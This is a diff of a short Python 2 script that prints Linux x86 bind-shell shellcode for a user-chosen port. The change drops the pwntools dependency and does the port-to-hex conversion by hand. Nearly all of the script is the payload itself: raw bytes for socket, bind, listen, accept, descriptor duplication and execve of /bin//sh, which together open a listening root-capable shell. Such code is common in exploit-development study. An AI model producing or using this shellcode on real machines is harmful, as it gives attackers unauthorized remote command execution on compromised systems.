@@ -9,7 +9,6 @@
 #---------------------------------------------------------------------------------------------#
 
 import sys
-from pwn import *
 
 #---------------#---------#
 W  = '\033[0m'  # White   #
@@ -33,15 +32,9 @@ if port < 1 or port > 65535:
 if port <= 1024:
   print P+ "This port require root privileges!" +W
 
-# Set pwntools context
-context.endian='big'
-context.arch='i386'
-context.bits=32
-context.log_level="debug"
-
 # Change port to Shellcode 
-port_shellcode = repr(p16(port))
-port_shellcode = port_shellcode.replace("'", "")
+port_shellcode = format(port, '04x')
+port_shellcode = "\\x" + str(port_shellcode[0:2]) + "\\x" + str(port_shellcode[2:4])  
 
 # Print final Shellcode, and highlight port in yellow ;)
 print P+ "\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x50\\xb0\\x66\\xfe\\xc3\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\x5b\\x5f\\x52\\x66\\x68" + Y+ port_shellcode + P+ "\\x66\\x53\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x5a\\xb0\\x66\\x80\\xc3\\x02\\xcd\\x80\\x50\\x50\\xb0\\x66\\x43\\x52\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\x80\\xc1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80" +W
